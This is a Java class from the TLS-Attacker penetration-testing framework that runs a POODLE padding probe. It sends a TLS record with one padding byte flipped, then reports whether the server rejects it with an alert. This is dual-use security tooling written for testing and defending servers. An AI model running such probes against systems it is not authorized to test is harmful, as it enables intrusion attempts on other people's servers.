/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.attacks.config.PoodleCommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.VariableModification;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.alert.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.application.ApplicationMessage;
import de.rub.nds.tlsattacker.tls.record.Record;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.TlsContextAnalyzer;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes a poodle attack. It logs an error in case the tested server is
 * vulnerable to poodle.
 * 
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class PoodleAttack extends Attacker<PoodleCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(PoodleAttack.class);

    public PoodleAttack(PoodleCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();

	ModifiableByteArray padding = new ModifiableByteArray();
	// we xor just the first byte in the padding
	// if the padding was {0x02, 0x02, 0x02}, it becomes {0x03, 0x02, 0x02}
	VariableModification<byte[]> modifier = ByteArrayModificationFactory.xor(new byte[] { 1 }, 0);
	padding.setModification(modifier);

	ApplicationMessage applicationMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
	Record r = new Record();
	r.setPadding(padding);
	applicationMessage.addRecord(r);

	AlertMessage allertMessage = new AlertMessage(ConnectionEnd.SERVER);

	trace.getProtocolMessages().add(applicationMessage);
	trace.getProtocolMessages().add(allertMessage);

	workflowExecutor.executeWorkflow();

	TlsContextAnalyzer.AnalyzerResponse analyzerResponse = TlsContextAnalyzer
		.containsAlertAfterModifiedMessage(tlsContext);
	if (analyzerResponse == TlsContextAnalyzer.AnalyzerResponse.ALERT) {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT,
		    "NOT Vulnerable. The modified message padding was identified, the server correctly responds with an alert message");
	} else if (analyzerResponse == TlsContextAnalyzer.AnalyzerResponse.NO_ALERT) {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT,
		    "Vulnerable(?). The modified message padding was not identified, the server does NOT respond with an alert message");
	} else {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT,
		    "Vulnerable(?). The protocol message flow was incomplete, analyze the message flow");
	}

	transportHandler.closeConnection();
    }
}
